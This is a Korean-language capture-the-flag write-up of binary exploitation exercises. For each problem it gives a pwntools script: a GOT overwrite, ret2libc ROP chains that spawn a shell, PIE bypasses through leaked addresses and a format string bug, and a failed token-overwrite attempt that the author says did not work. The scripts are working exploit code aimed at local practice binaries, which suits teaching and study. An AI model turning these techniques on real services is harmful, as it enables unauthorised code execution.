# rop


## problem 1

GOT Overwrite를 하는 문제이다. 포인터를 통해 puts의 GOT를 gift의 주소로 변경하면 puts함수를 실행할 때 gift로 점프해 실행하도록 만들 수 있다. gdb를 통해 디버깅하여 puts의 GOT와 gift함수의 주소를 알 수 있다. 

```python
from pwn import *

p = process('./got_overwrite')

puts_got = 0x404018
gift = 0x4011d6

p.recvuntil(b"addr: ")
p.sendline(str(puts_got))
p.recvuntil(b"value: ")
p.sendline(str(gift))

p.interactive()
```


## problem 3

ROP 문제로, 주어진 printf 함수의 실제 주소를 활용하여 system과 '/bin/sh'의 주소를 찾을 수 있다. 가젯의 주소를 찾기 위해서 pie를 우회해야 하는데, libc의 offset을 이용하여서 가젯의 실제 주소도 찾을 수 잇다. 이후 가젯과 binsh, system_addr를 사용하여 payload를 작성하면 된다.

```python

from pwn import *

p = process('./onegadget')
e = ELF('./onegadget')
libc = e.libc
rop = ROP(e)

p.recvuntil(b'printf Function is at: ')
printf_addr = int(p.recv(14), 16)

libc_base = printf_addr - libc.symbols['printf']
system_addr = libc_base + libc.symbols['system']
binsh = libc_base + list(libc.search(b'/bin/sh'))[0]
pop_rdi = libc_base + (r
op.find_gadget(['pop rdi', 'ret']))[0]

log.info("libc base : %s"%hex(libc_base))
log.info("system addr : %s"%hex(system_addr))
log.info("pop rdi: %s"%hex(pop_rdi))


payload = b'A'*0x20
payload += b'B'*0x8
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system_addr)

p.sendline(payload)

p.interactive()

```




## problem 3-2

마찬가지로 ROP 문제이다. puts를 이용하여 puts 함수의 실제 주소를 구하고, 이를 바탕으로 system과 '/bin/sh'의 주소를 구한다. payload에 main함수의 주소를 추가하여 다시 반복하게 한 뒤에 pop_rdi, binsh, system_addr를 보내면 쉘을 얻을 수 있다.

```python

from pwn import *

p = process("./rop2")
e = ELF("./rop2")
libc = e.libc

puts_plt = 0x401060
puts_got = 0x404018
pop_rdi = 0x401283
main = 0x4011cf

p.recvuntil(b'buf:')

payload = b'A'*1024
payload += b'B'*0x8

payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

p.sendline(payload)

puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))

libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh = libc_base + list(libc.search(b'/bin/sh'))[0]

log.info("libc base : %s"%hex(libc_base))


payload = b'A'*1024
payload += b'B'*0x8
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system_addr)

p.sendline(payload)

p.interactive()


```



## problem 4

pie를 우회하는 문제이다. main addr에서 main의 offset을 빼서 pie base를 구한 뒤 win의 실제 주소를 구하고 그것을 ret에 덮어쓰면 된다.


```python

from pwn import *

p = process('./simple_pie_32')
e = ELF('./simple_pie_32')
libc = e.libc

p.recvuntil(b'at: 0x')
main_addr = int(p.recvline(), 16)
pie_base = main_addr - 0x122d
win_addr = pie_base + 0x1291

payload = b'A'*0x1c
payload += b'A'*0x4
payload += p32(win_addr)


p.sendline(payload)

p.interactive()

```



## problem 5

pie 기법을 우회하는 문제이다. vuln 함수의 실제 주소를 구하려면 fsb를 이용해서 return값을 찾을 수 있다고 생각했다. 4칸만큼 떨어진 곳의 주소를 받아온 뒤에 주소를 이용해여 win함수의 주소를 구하고 그것을 덮는 payload를 보내면 쉘을 얻을 수 있다.

```python

from pwn import *

p = process('./pie')
e = ELF('./pie')
libc = e.libc

payload = b"%[4]$p"

p.sendline(payload)
vuln_addr = u64(p.recvuntil(b'\x10')[-6:].ljust(8, b'\x00'))

pie_base = vuln_addr - 0x1210
win_addr = pie_base + 0x126f

payload = b'A'*0x10
payload += b'B'*0x8
payload += p64(win_addr)

p.sendline(payload)

p.interactive()


```



## problem 6

token의 값을 1로 변조해야 하는 문제이다.


```python

from pwn import *

p = process('./token')
e = ELF('./token')

token = e.symbols['token']

payload = b'A'*1024;
payload += b'B'*0x8;
payload += p64(token)
payload += '%{}c'.format(0x1024+1-4)
payload += '%2$hhn'

p.sendline(payload)

p.interactive()

```

fsb 버그 변조와 유사해 보여서 시도해 보았지만 풀지 못했다. ㅜㅜ




